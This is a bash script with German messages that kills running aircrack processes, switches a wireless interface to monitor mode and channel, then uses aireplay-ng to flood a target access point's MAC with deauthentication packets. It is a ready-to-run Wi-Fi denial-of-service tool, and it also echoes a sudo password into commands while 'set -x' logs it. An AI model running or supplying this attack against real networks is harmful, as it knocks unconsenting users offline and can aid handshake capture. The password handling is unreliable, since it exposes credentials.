#!/bin/bash

set -x

INTERFACE="$1"
TARGET_MAC="$2"
PACKETS="$3"
DESIRED_CHANNEL="$4"
SECRET="$5"

if [ -z "$INTERFACE" ] || [ -z "$TARGET_MAC" ]; then
  echo "❌ Interface oder MAC-Adresse fehlen"
  exit 1
fi

# Default-Werte
PACKETS=${PACKETS:-100}
DESIRED_CHANNEL=${DESIRED_CHANNEL:-6}

# kill airodump
echo $SECRET | sudo -S killall airodump-ng
echo $SECRET | sudo -S killall aircrack-ng
echo $SECRET | sudo -S killall airmon-ng

echo $SECRET | sudo -S airmon-ng check kill
echo $SECRET | sudo -S airmon-ng stop "$INTERFACE"

# Prüfe ob das Interface im Monitor-Modus ist
MODE=$(iwconfig "$INTERFACE" 2>/dev/null | grep -o 'Mode:[^ ]*' | cut -d: -f2)
if [ "$MODE" != "Monitor" ]; then
  echo "[i] Setze $INTERFACE in den Monitor-Modus..."
  echo $SECRET | sudo -S ip link set "$INTERFACE" down
  echo $SECRET | sudo -S iw dev "$INTERFACE" set type monitor
  echo $SECRET | sudo -S ip link set "$INTERFACE" up
  echo $SECRET | sudo -S iw dev "$INTERFACE" set power_save off
fi

# 1) Aktuellen Kanal ermitteln
CURRENT_CHANNEL=$(iw dev "$INTERFACE" info 2>/dev/null \
  | awk '/channel/ {print $2; exit}')

if [ -z "$CURRENT_CHANNEL" ]; then
  echo "⚠️  Konnte aktuellen Kanal nicht ermitteln. Nutze gewünschten Kanal $DESIRED_CHANNEL"
  CURRENT_CHANNEL="$DESIRED_CHANNEL"
fi

echo "🔍 Aktueller Kanal: $CURRENT_CHANNEL"
echo "🎯 Gewünschter Kanal: $DESIRED_CHANNEL"

# 2) Kanal ggf. anpassen
if [ "$CURRENT_CHANNEL" -ne "$DESIRED_CHANNEL" ]; then
  echo "🔁 Setze Kanal $DESIRED_CHANNEL für Interface $INTERFACE"
  echo $SECRET | sudo -S iwconfig "$INTERFACE" channel "$DESIRED_CHANNEL"
  sleep 1
else
  echo "✅ Kanal stimmt bereits. Kein Wechsel nötig."
fi

# 3) Deauth-Pakete senden
echo "🚀 Sende $PACKETS Deauth-Pakete an $TARGET_MAC über $INTERFACE (Kanal $DESIRED_CHANNEL)"
sudo aireplay-ng --deauth "$PACKETS" -a "$TARGET_MAC" "$INTERFACE"
